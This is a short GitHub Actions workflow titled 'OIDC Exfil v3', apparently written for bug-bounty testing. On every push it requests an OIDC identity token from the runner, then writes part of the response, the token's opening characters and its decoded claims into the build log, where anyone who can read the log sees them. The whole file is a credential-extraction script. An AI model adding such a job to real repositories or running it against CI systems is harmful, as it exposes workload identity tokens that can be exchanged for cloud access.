name: OIDC Exfil v3
on: [push]
permissions:
  id-token: write
  contents: read
jobs:
  get-token:
    runs-on: ubuntu-latest
    steps:
      - name: Fetch OIDC token
        run: |
          echo "URL=$ACTIONS_ID_TOKEN_REQUEST_URL"
          curl -sS -H "Authorization: Bearer ${{ github.token }}" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=bb-test" > /tmp/resp.json || true
          head -c 400 /tmp/resp.json
          echo ""
          TOKEN=$(python3 -c "import json; print(json.load(open('/tmp/resp.json')).get('value','NONE'))" 2>/dev/null)
          echo "TOKEN_START=${TOKEN:0:30}"
          if [ "$TOKEN" != "NONE" ]; then
            PAYLOAD=$(echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null)
            echo "PAYLOAD=$PAYLOAD"
          fi
